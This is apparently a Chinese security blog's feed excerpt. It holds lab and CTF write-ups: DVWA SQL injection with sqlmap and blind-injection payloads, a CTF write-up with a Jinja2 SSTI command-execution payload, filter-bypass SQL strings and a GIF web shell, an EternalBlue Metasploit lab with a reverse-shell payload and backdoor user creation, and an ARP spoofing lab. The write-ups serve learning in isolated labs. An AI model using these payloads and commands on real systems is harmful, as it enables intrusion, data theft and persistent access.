<pre><code class="language-sql">sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --cookie=&quot;security=low; deviceid=1637736638476; xinhu_mo_adminid=tlt0tln0jm0vj0tll0at0jo0vf0aj0mt0fl0tlv0aa0ja0ah0mj011; xinhu_ca_adminuser=admin; xinhu_ca_rempass=1; xinhu_ca_adminpass=zz0er0zg0dii0ze0qe0ec0cb01; PHPSESSID=kbnfql7gssetlsjdcvp8btvr13&quot; -D dvwa -T users -C user,password –dump
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20220415012118950.png" alt="image-20220415012118950" loading="lazy"></figure>
<h2 id="sql-injection-medium">SQL Injection-Medium</h2>
<p>抓包，post方式提交数据</p>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20220415012132436.png" alt="image-20220415012132436" loading="lazy"></figure>
<p>把包保存到本地，用sqlmap注入</p>
<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post.txt –dbs查库
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20220415012146073.png" alt="image-20220415012146073" loading="lazy"></figure>
<p>和low一样的操作查后续信息</p>
<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post.txt -D dvwa –tables查表
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20220415012152768.png" alt="image-20220415012152768" loading="lazy"></figure>
<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post.txt -D dvwa -T users –columns查列
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20220415012208701.png" alt="image-20220415012208701" loading="lazy"></figure>
<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post.txt -D dvwa -T users -C user,user_id --dump
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20220415012222670.png" alt="image-20220415012222670" loading="lazy"></figure>
<h2 id="sql-injection-high">SQL Injection-High</h2>
<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20220415012231790.png" alt="image-20220415012231790" loading="lazy"></figure>
<p>抓包，尝试手注</p>
<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20220415012324805.png" alt="image-20220415012324805" loading="lazy"></figure>
<p>回显两个数据，说明有两个注入点</p>
<figure data-type="image" tabindex="13"><img src="https://z0ekball.github.io/post-images/image-20220415012355929.png" alt="image-20220415012355929" loading="lazy"></figure>
<pre><code class="language-sql">查数据库：1' union select 1,database()#
</code></pre>
<figure data-type="image" tabindex="14"><img src="https://z0ekball.github.io/post-images/image-20220415012400865.png" alt="image-20220415012400865" loading="lazy"></figure>
<pre><code class="language-sql">查表：1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#，报错
</code></pre>
<figure data-type="image" tabindex="15"><img src="https://z0ekball.github.io/post-images/image-20220415012441759.png" alt="image-20220415012441759" loading="lazy"></figure>
<p>没能解决这个问题，换一个思路，用sqlmap</p>
<p>抓包保存，由于题目在弹出的窗口上写入注入语句，在原来的网页回显，所以要设置重定向的网络</p>
<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post2.txt --second-url &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/&quot; –dbs
</code></pre>
<figure data-type="image" tabindex="16"><img src="https://z0ekball.github.io/post-images/image-20220415012454901.png" alt="image-20220415012454901" loading="lazy"></figure>
<p>后续步骤和前面的两题相同</p>
<h2 id="sql-injection-blind-low">SQL Injection (Blind)-Low</h2>
<p>无过滤get盲注</p>
<pre><code class="language-sql">1' and (length(database())&gt;3 and length(database())&lt;5)#
</code></pre>
<figure data-type="image" tabindex="17"><img src="https://z0ekball.github.io/post-images/image-20220415012520420.png" alt="image-20220415012520420" loading="lazy"></figure>
<p>说明数据库长度为4</p>
<pre><code class="language-sql">1’ and ascii(substr(database(),1,1))=100#
</code></pre>
<figure data-type="image" tabindex="18"><img src="https://z0ekball.github.io/post-images/image-20220415012525108.png" alt="image-20220415012525108" loading="lazy"></figure>
<p>说明数据库第一个字母为d</p>
<p>结合脚本爆破数据库名：</p>
<p>抓包获取url和cookie，加入请求头</p>
<figure data-type="image" tabindex="19"><img src="https://z0ekball.github.io/post-images/image-20220415012554111.png" alt="image-20220415012554111" loading="lazy"></figure>
<p>修改注入字段得到查表脚本：</p>
<pre><code class="language-sql">inner = &quot;?id=1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%u,1))=%u %%23&amp;Submit=Submit#&quot;
</code></pre>
<figure data-type="image" tabindex="20"><img src="https://z0ekball.github.io/post-images/image-20220415012622039.png" alt="image-20220415012622039" loading="lazy"></figure>
<h2 id="sql-injection-blind-medium">SQL Injection (Blind)-Medium</h2>
<p>有过滤post盲注</p>
<p>结合burpsuite和脚本进行注入：id=1 and 1=1#&amp;Submit=Submit</p>
<figure data-type="image" tabindex="21"><img src="https://z0ekball.github.io/post-images/image-20220415012639939.png" alt="image-20220415012639939" loading="lazy"></figure>
<p>burpsuite爆破库长度</p>
<figure data-type="image" tabindex="22"><img src="https://z0ekball.github.io/post-images/image-20220415012657971.png" alt="image-20220415012657971" loading="lazy"></figure>
<p>简单数字爆破</p>
<figure data-type="image" tabindex="23"><img src="https://z0ekball.github.io/post-images/image-20220415012703391.png" alt="image-20220415012703391" loading="lazy"></figure>
<p>返回长度判断长度为4</p>
<figure data-type="image" tabindex="24"><img src="https://z0ekball.github.io/post-images/image-20220415012707835.png" alt="image-20220415012707835" loading="lazy"></figure>
<p>脚本爆破库名</p>
<figure data-type="image" tabindex="25"><img src="https://z0ekball.github.io/post-images/image-20220415012745679.png" alt="image-20220415012745679" loading="lazy"></figure>
<p>类似low，爆破表名：</p>
<pre><code class="language-sql">inner = &quot;1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%u,1))=%u #&quot;
</code></pre>
<figure data-type="image" tabindex="26"><img src="https://z0ekball.github.io/post-images/image-20220415012802867.png" alt="image-20220415012802867" loading="lazy"></figure>
<h2 id="sql-injection-blind-high">SQL Injection (Blind)-High</h2>
<p>把提交数据和回显数据分开输入与返回，有效加大了脚本注入的难度，采用手注</p>
<figure data-type="image" tabindex="27"><img src="https://z0ekball.github.io/post-images/image-20220415012825557.png" alt="image-20220415012825557" loading="lazy"></figure>
<pre><code class="language-sql">1' and length(database())&gt;4#
</code></pre>
<figure data-type="image" tabindex="28"><img src="https://z0ekball.github.io/post-images/image-20220415012833176.png" alt="image-20220415012833176" loading="lazy"></figure>
<pre><code class="language-sql">1' and length(database())=4#
</code></pre>
<figure data-type="image" tabindex="29"><img src="https://z0ekball.github.io/post-images/image-20220415012847028.png" alt="image-20220415012847028" loading="lazy"></figure>
<p>库名长为4</p>
<p>后续注入和前面相同</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[秋季赛WP]]></title>
        <id>https://z0ekball.github.io/post/qiu-ji-sai-wp/</id>
        <link href="https://z0ekball.github.io/post/qiu-ji-sai-wp/">
        </link>
        <updated>2021-10-20T12:25:04.000Z</updated>
        <content type="html"><![CDATA[<h1 id="秋季赛wp">秋季赛WP</h1>
<p>一个人就是一支队伍</p>
<h2 id="web">WEB</h2>
<h3 id="easy-ssti">Easy-ssti</h3>
<p>服务器模板注入，jinja2漏洞，{{7*7}}有回显说明有注入漏洞，_和[被过滤，用require函数结合attr绕过。<br>
Jinja2模板参考<br>
<a href="http://doc.yonyoucloud.com/doc/jinja2-docs-cn/templates.html%23builtin-filters">http://doc.yonyoucloud.com/doc/jinja2-docs-cn/templates.html#builtin-filters</a></p>
<p>注入语句：</p>
<pre><code class="language-php">{{lipsum|attr(request.args.a)|attr(&quot;get&quot;)(request.args.b)|attr(&quot;get&quot;)(&quot;e&quot;+&quot;val&quot;) (request.args.c)}}&amp;a=globals&amp;b=builtins&amp;c=import(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()

&quot;e&quot;+&quot;val&quot; ‘o’+’s’ “编码”.decode(‘base64’)绕过敏感字
</code></pre>
<h3 id="easy-sql1">Easy-sql1</h3>
<p>常规的1’/<strong>/or/</strong>/1&gt;0#和order by之后，经历一番绕过得出能运行的注入语句：</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/database(),2)#&amp;password=
</code></pre>
<p>得到数据库名<br>
<img src="https://z0ekball.github.io/post-images/image-20220414200716689.png" alt="" loading="lazy"></p>
<p>因为=被过滤，不想麻烦绕过就直接爆出整个表名</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/group_concat(table_name),2/**/from/**/information_schema.tables)#&amp;password=
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220414200726337.png" alt="" loading="lazy"></figure>
<p>查找到含flag的表名:flag_table_1</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/FLAG,2/**/from/**/flag_table_1)#&amp;password=
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220414200749595.png" alt="" loading="lazy"></figure>
<p>得flag</p>
<h3 id="easy-ez_upload">Easy-ez_upload</h3>
<p>用御剑扫描目录<br>
<img src="https://z0ekball.github.io/post-images/image-20220414200819812.png" alt="" loading="lazy"><br>
访问/robot.txt<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201035855.png" alt="" loading="lazy"></p>
<p>得文件上传地址,只允许图片上传。用一句话木马攻击，尝试各种方法都没法上传成php格式后,尝试图马。一开始直接把一句话木马写在图片末尾，上传后发现被过滤掉了，考虑二次渲染。网上说png、jpeg不好改，用gif改。用winhex对比原gif和二次渲染过的gif找出相同的字段，插入木马。<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201044815.png" alt="" loading="lazy"><br>
上传图片，木马没有被过滤，但图片还是以gif格式解析，蚁剑无法连接…卡了好久之后看原来黑屏的网页<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201056641.png" alt="" loading="lazy"></p>
<p>明明有提示文件包含我却没看…</p>
<p>利用文件包含漏洞，使gif以php格式解析，访问<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201118117.png" alt="" loading="lazy"><br>
蚁剑终于连接成功<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201126951.png" alt="" loading="lazy"><br>
找不到flag文件，用命令行试试<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201206436.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220414201222636.png" alt="" loading="lazy"></p>
<p>找到flag</p>
<h3 id="medium-web4">Medium-web4</h3>
<p>布尔盲注，感觉出题人应该是个好人，所以猜测是同一个库，尝试题目sql1的注入语句</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/FLAG,2/**/from/**/flag_table_1)#&amp;password=
</code></pre>
<p>回显是good，说明猜对了</p>
<pre><code>username=1'or(length(database())&gt;6)#&amp;password=   good
username=1'or(length(database())&gt;7)#&amp;password=   try again
</code></pre>
<p>库名长度为7，猜应该是cumtctf，脚本爆破验证一下<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201316832.png" alt="" loading="lazy"></p>
<p>没猜错，因为sql1的语句回显是good，猜测flag还是在flag_table_1</p>
<p>因为=被过滤，判断字符用&lt;和&gt;绕过</p>
<pre><code>username=1'or(select(ascii(mid((select(flag)from(flag_table_1)limit/**/0,1),1,
1)))&gt;0)%26%26(select(ascii(mid((select(flag)from(flag_table_1)limit/**/0,1),1,
1)))&lt;125)#&amp;password=
</code></pre>
<p>回显good，说明又猜对了，上脚本爆破得flag（脚本绕过语句存在注释符,所以和手注有区别，绕过空格不能用/**/,而用/<em>!</em>/），flag长度猜大一点<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201336573.png" alt="" loading="lazy"></p>
<h2 id="re">RE</h2>
<h3 id="easy-签到">Easy-签到</h3>
<p>ida常规通过字符串找到函数<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201406640.png" alt="" loading="lazy"><br>
16进制解码得flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201446312.png" alt="" loading="lazy"></p>
<h3 id="easy-net">Easy-net</h3>
<p>提示net，因为没有.net环境，无法看运行情况，但用ILSpy能直接反编译函数<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201548593.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220414201600870.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220414201636689.png" alt="" loading="lazy"></p>
<p>大致意思就是一个字符串经过一系列运算，能经过最后一个if判断。逆向爆破可以得到这个字符串，问题是不知道字符串长度。但经过算法OJ题的轮番折磨，我知道array2[j]里的j不能超过该数组长度28（array2有28个数），所以j最大值即字符串长度为28。</p>
<p>这就好办了，上脚本爆破得flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201654601.png" alt="" loading="lazy"></p>
<h2 id="pwn">PWN</h2>
<h3 id="easy-pwn1">Easy-pwn1</h3>
<p>Nc一下，cat flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201725664.png" alt="" loading="lazy"></p>
<h3 id="easy-pwn2">Easy-pwn2</h3>
<p>标准栈溢出，buf是0x40h但要读入0x60h的数据，参考攻防世界栈溢出的题解写脚本<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201801302.png" alt="" loading="lazy"><br>
Call system地址<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201819493.png" alt="" loading="lazy"><br>
填充0x48覆盖buf和push内容，再覆盖返回地址，脚本：<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201828914.png" alt="" loading="lazy"><br>
执行<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201839150.png" alt="" loading="lazy"></p>
<h3 id="easy-pwn3">Easy-pwn3</h3>
<p>exeinfo查了一下, 32位<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201911585.png" alt="" loading="lazy"></p>
<p>用ida32打开，通过字符串找到函数<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201924140.png" alt="" loading="lazy"></p>
<p>查资料时发现博客</p>
<p><a href="https://blog.csdn.net/weixin_44145820/article/details/105482269">(10条消息) BUUCTF-PWN刷题记录-6_L.o.W的博客-CSDN博客</a></p>
<p>不能说毫无相关，简直就是一模一样…</p>
<p>先填充满缓冲区，泄露ebp，然后使用栈迁移执行system，运行得flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201935583.png" alt="" loading="lazy"></p>
<h2 id="crypto">Crypto</h2>
<h3 id="easy-签到-2">Easy-签到</h3>
<p>逆向爆破，懒得判断数字和符号，爆出来再加上就是flag</p>
<p>脚本<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202014958.png" alt="" loading="lazy"><br>
加上数字和符号<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202025543.png" alt="" loading="lazy"></p>
<h3 id="easy-lcg">Easy-lcg</h3>
<p>LCG就是线性同余法，得到的是弱伪随机数，参考lcg教程</p>
<p>http://www.manongjc.com/detail/22-hpzrquvdaforjqj.html</p>
<p>参考里面的脚本，运行得到flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202049990.png" alt="" loading="lazy"></p>
<h2 id="misc">Misc</h2>
<h3 id="easy-签到-3">Easy-签到</h3>
<p>base32解密<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202112612.png" alt="" loading="lazy"></p>
<h3 id="easy-lsb">Easy-LSB?</h3>
<p>LSB隐写，Stegslove多次尝试修改低位的0、1，如图拿到flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202129805.png" alt="" loading="lazy"></p>
<h3 id="easy-压缩包">Easy-压缩包</h3>
<p>有点阴间的题目，第一个压缩包就是伪加密，HXD打开修改全局方式位标记为00 00，能够打开压缩包，得到下一个压缩包。HXD查看是真加密，根据提示用ziperello爆破得密码<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202148412.png" alt="" loading="lazy"></p>
<p>又得到了真两个加密文件，卡了好久之后想起加密的图在别的题里有原图，对比两这的冗余码，确认是同一个文件。一个已知解密文件和一个相同的加密文件不就是明文攻击嘛。</p>
<p>把已知图片压缩成包，ARCHPR明文攻击得密码，解开的flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202156116.png" alt="" loading="lazy"></p>
<h3 id="easy-加密">Easy-加密？</h3>
<p>套娃加密题，图片是福尔摩斯密码，解密得到密码SHERLOCK</p>
<p>第二个压缩包的txt文件是零宽字符加密，解密得密码<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202220004.png" alt="" loading="lazy"></p>
<p>打开flag文件, base16解密<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202227205.png" alt="" loading="lazy"></p>
<h3 id="medium-社工">Medium-社工？</h3>
<p>一开始用微信QQ扫码都没用，就着jpeg研究了好久还是解不出，直到我知道一个叫中国编码的东东…<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202251180.png" alt="" loading="lazy"></p>
<p>WANG/JIA就是这个人的名字，也就拿到了flag</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[永恒之蓝漏洞利用实验(Nmap、MSF)]]></title>
        <id>https://z0ekball.github.io/post/yong-heng-zhi-lan-lou-dong-li-yong-shi-yan-nmapmsf/</id>
        <link href="https://z0ekball.github.io/post/yong-heng-zhi-lan-lou-dong-li-yong-shi-yan-nmapmsf/">
        </link>
        <updated>2021-10-15T15:25:37.000Z</updated>
        <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2>
<h3 id="ip">IP</h3>
<p>靶机：win7     ip：192.168.89.130</p>
<p>攻击机：kali    ip：192.168.89.129</p>
<pre><code class="language-c">//kali查本机地址
ip adress show 
//windows查本机地址
ipconfig         
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20211021013755009.png" alt="image-20211021013755009" loading="lazy"></figure>
<h3 id="nmap">nmap</h3>
<pre><code class="language-c">//二层主机发现
nmap -sn 192.168.89.129/24
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20211021013902305.png" alt="image-20211021013902305" loading="lazy"></figure>
<pre><code class="language-c">//端口扫描
namp -sS 192.168.89.130
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20211021021443783.png" alt="image-20211021021443783" loading="lazy"></figure>
<pre><code class="language-c">//识别操作系统
nmap -O 192.168.89.130
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20211021021603442.png" alt="image-20211021021603442" loading="lazy"></figure>
<h3 id="靶机信息">靶机信息</h3>
<p>使用<code>windows-exploit-suggester</code>查找没有打补丁的漏洞</p>
<pre><code class="language-c">//得到最新漏洞表
python windows-exploit-suggester.py –update
</code></pre>
<p>在win7上面生成一个系统信息win7.txt 然后传到kali上（这一步现实渗透里要通过提权得到）</p>
<pre><code class="language-c">systeminfo &gt; win7.txt
</code></pre>
<p>对比最新漏洞表和win7信息，得到未打补丁的漏洞信息</p>
<pre><code class="language-c">/root/Windows-Exploit-Suggester-master/windows-exploit-suggester.py --database /root/2021-10-18-mssb.xls --systeminfo /root/桌面/win7.txt
</code></pre>
<p>这里有个坑，用最新版的xlrd无法运行</p>
<pre><code class="language-c">python2 -m pip install xlrd==1.2.0
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20211021022228786.png" alt="image-20211021022228786" loading="lazy"></figure>
<p>存在可利用poc的漏洞</p>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20211021022313834.png" alt="image-20211021022313834" loading="lazy"></figure>
<h2 id="永恒之蓝漏洞利用">永恒之蓝漏洞利用</h2>
<p>由信息收集可以知道，win7的445端口打开，永恒之蓝正是针对445端口的，可利用永恒之蓝漏洞进行攻击。</p>
<h3 id="msf">MSF</h3>
<p>使用<code>msfconsole</code>攻击:</p>
<pre><code class="language-c++">//分析模块
msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010
msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; show options
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20211021022645521.png" alt="image-20211021022645521" loading="lazy"></figure>
<pre><code class="language-php">//设置端口
set RhOSTS 192.168.89.130
//执行
run
</code></pre>
<p>存在永恒之蓝漏洞</p>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20211021023124790.png" alt="image-20211021023124790" loading="lazy"></figure>
<pre><code class="language-c++">//使用永恒之蓝攻击模块
msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue
//查看攻击对象
msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show targets
//查看选项
msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20211021023348120.png" alt="image-20211021023348120" loading="lazy"></figure>
<pre><code class="language-c++">//设置playload
msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set playload windows/x64/shell/reverse_tcp
playload =&gt; windows/x64/shell/reverse_tcp
//设置端口
msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set RhOSTS 192.168.89.130
RhOSTS =&gt; 192.168.89.130
//运行
msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run
</code></pre>
<p>得到可执行命令行</p>
<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20211021023530811.png" alt="image-20211021023530811" loading="lazy"></figure>
<pre><code class="language-php">//解决乱码
chcp 65001
//查看权限
whoami
//添加用户
net user admin admin /add
</code></pre>
<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20211021023626837.png" alt="image-20211021023626837" loading="lazy"></figure>
<p>看看靶机win7，创建成功，说明攻击成功</p>
<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20211021023909688.png" alt="image-20211021023909688" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ARP欺骗实验]]></title>
        <id>https://z0ekball.github.io/post/arp-qi-pian-shi-yan/</id>
        <link href="https://z0ekball.github.io/post/arp-qi-pian-shi-yan/">
        </link>
        <updated>2021-10-14T15:59:00.000Z</updated>
        <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2>
<p><code>网关</code>：IP:192.168.89.2     MAC: 00:50:56:fd:c6:0f</p>
<p><code>攻击机</code>：IP: 192.168.89.129   MAC: 00:0c:29:e8:f7:fa<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235504335.png" alt="" loading="lazy"></p>
<p><code>靶机</code>：IP：192.168.89.130   MAC：00:0c:29:2f:af:50<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235510538.png" alt="" loading="lazy"></p>
<p>攻击机fping -g查看存活主机<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235516996.png" alt="" loading="lazy"></p>
<p>查勘表靶机arp缓存表<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235520684.png" alt="" loading="lazy"></p>
<h2 id="攻击过程">攻击过程</h2>
<p>使用<code>arping</code>进行攻击</p>
<pre><code>arping -S 192.168.89.2 -s 00:00:00:00:00:00 192.168.89.130
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220414235527380.png" alt="" loading="lazy"></figure>
<p>靶机ping baidu.com失败<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235624766.png" alt="" loading="lazy"></p>
<p>arp -a查看mac地址，网关已改变，攻击成功<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235632373.png" alt="" loading="lazy"></p>
<p>只要把网关MAC改为正确地址，即可解除攻击<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235656428.png" alt="" loading="lazy"></p>
<p>靶机正常访问baidu.com，网关MAC正常<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235651949.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
</feed>